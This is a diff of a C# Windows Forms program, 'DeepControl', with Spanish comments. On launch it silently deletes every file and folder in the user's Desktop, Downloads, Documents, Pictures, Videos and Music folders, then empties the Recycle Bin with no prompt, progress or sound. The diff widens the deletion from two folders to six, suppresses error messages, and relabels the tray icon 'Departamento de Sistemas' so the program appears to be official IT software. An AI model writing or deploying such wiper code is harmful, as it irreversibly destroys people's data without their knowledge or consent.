@@ -7,50 +7,30 @@ namespace DeepControl
     using System.Windows.Forms;
     using System.IO;
     using System.Diagnostics;
-    public class RecycleBin
-    {
-        [Flags]
-        public enum RecycleFlags : uint
-        {
-            SHERB_NOCONFIRMATION = 0x00000001,SHERB_NOPROGRESSUI = 0x00000002,SHERB_NOSOUND = 0x00000004         
-        }
+    using System.Net;
+    using System.Net.Sockets;
+    using System.Text;
 
-        [DllImport("shell32.dll", CharSet = CharSet.Unicode)]
-        public static extern int SHEmptyRecycleBin(IntPtr hwnd, string pszRootPath, RecycleFlags dwFlags);
-
-        public static void EmptyRecycleBin()
-        {
-            int result = SHEmptyRecycleBin(IntPtr.Zero, null, RecycleFlags.SHERB_NOCONFIRMATION |
-                                                           RecycleFlags.SHERB_NOPROGRESSUI |
-                                                           RecycleFlags.SHERB_NOSOUND);
-            if (result != 0)
-            {
-                Console.WriteLine("Error: " + result);
-            }
-            else
-            {
-                Console.WriteLine("Papelera de reciclaje vaciada correctamente.");
-            }
-        }
-    }
     public partial class DeepControlForm : Form
     {
 
         [DllImport("user32.dll", CharSet = CharSet.Auto)]
         static extern int SystemParametersInfo(int uAction, int uParam, string lpvParam, int fuWinIni);
-
         private NotifyIcon notifyIcon;
-
         public DeepControlForm()
         {
             InitializeComponent();
-            
-          
-            notifyIcon = new NotifyIcon();
-
+            InicializarIcono();
+            limpiarCarpetas();
+            ColocarFondo();
+            RecycleBin.EmptyRecycleBin();
+        }
+        public void InicializarIcono()
+        {
             try
             {
-                string iconPath = "ico.ico"; 
+                notifyIcon = new NotifyIcon();
+                string iconPath = "ico.ico";
                 notifyIcon.Icon = new Icon(iconPath);
             }
             catch (Exception ex)
@@ -58,40 +38,58 @@ namespace DeepControl
                 MessageBox.Show("Error al cargar el icono: " + ex.Message);
                 notifyIcon.Icon = SystemIcons.Application;
             }
-
             notifyIcon.Visible = true;
-            notifyIcon.Text = "DeepControl";
+            notifyIcon.Text = "Departamento de Sistemas";
+        }
+        public void limpiarCarpetas()
+        {
 
-          
-
-            string appDirectory = AppDomain.CurrentDomain.BaseDirectory;
-       
-            string imagePath = Path.Combine(appDirectory, "fondo.jpg");
-            SetWallpaper(imagePath);
-
-
-        
-
-            //Metodo();
             try
             {
                 string desktopPath = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
-                string directoryPath = desktopPath/* "C:\\Users\\Ernesto\\Desktop\\Borrar";*/;
-                DeleteAllFiles(directoryPath);
-                DeleteAllDirectories(directoryPath);
                 string documentsPath = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments);
-                directoryPath = documentsPath;
-                DeleteAllFiles(directoryPath);
-                DeleteAllDirectories(directoryPath);
-                Console.WriteLine("Todos los archivos han sido borrados exitosamente.");
+                string picturesPath = Environment.GetFolderPath(Environment.SpecialFolder.MyPictures);
+                string videosPath = Environment.GetFolderPath(Environment.SpecialFolder.MyVideos);
+                string musicPath = Environment.GetFolderPath(Environment.SpecialFolder.MyMusic);
+                string downloadsPath = "";
+
+                if (Directory.Exists(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile) + "\\Downloads"))
+                {
+                     downloadsPath = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile) + "\\Downloads";
+                }
+                else
+                {
+                     downloadsPath = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile) + "\\Descargas";
+                }
+                DeleteAll(desktopPath);
+                DeleteAll(downloadsPath);
+                DeleteAll(documentsPath);
+                DeleteAll(picturesPath);
+                DeleteAll(videosPath);
+                DeleteAll(musicPath);
+
             }
             catch (Exception ex)
             {
-                Console.WriteLine($"Ocurrió un error: {ex.Message}");
-                MessageBox.Show($"Este es un mensaje de {ex.Message}.", "Información", MessageBoxButtons.OK, MessageBoxIcon.Information);
+                
             }
-            RecycleBin.EmptyRecycleBin();
         }
+        public void DeleteAll(string directoryPath)
+        {
+            DeleteAllFiles(directoryPath);
+            DeleteAllDirectories(directoryPath);
+        }
+
+
+         public void ColocarFondo()
+        {
+            string appDirectory = AppDomain.CurrentDomain.BaseDirectory;
+            string imagePath = Path.Combine(appDirectory, "fondo.jpg");
+            SetWallpaper(imagePath);
+
+        }
+
+       
         public static void SetWallpaper(string path)
         {
             const int SPI_SETDESKWALLPAPER = 20;
@@ -172,6 +170,32 @@ namespace DeepControl
             else
             {
                 Debug.WriteLine("El directorio no existe.");
+            }
+        }
+    }
+    public class RecycleBin
+    {
+
+        public enum RecycleFlags : uint
+        {
+            SHERB_NOCONFIRMATION = 0x00000001, SHERB_NOPROGRESSUI = 0x00000002, SHERB_NOSOUND = 0x00000004
+        }
+
+        [DllImport("shell32.dll", CharSet = CharSet.Unicode)]
+        public static extern int SHEmptyRecycleBin(IntPtr hwnd, string pszRootPath, RecycleFlags dwFlags);
+
+        public static void EmptyRecycleBin()
+        {
+            int result = SHEmptyRecycleBin(IntPtr.Zero, null, RecycleFlags.SHERB_NOCONFIRMATION |
+                                                           RecycleFlags.SHERB_NOPROGRESSUI |
+                                                           RecycleFlags.SHERB_NOSOUND);
+            if (result != 0)
+            {
+                Console.WriteLine("Error: " + result);
+            }
+            else
+            {
+                Console.WriteLine("Papelera de reciclaje vaciada correctamente.");
             }
         }
     }
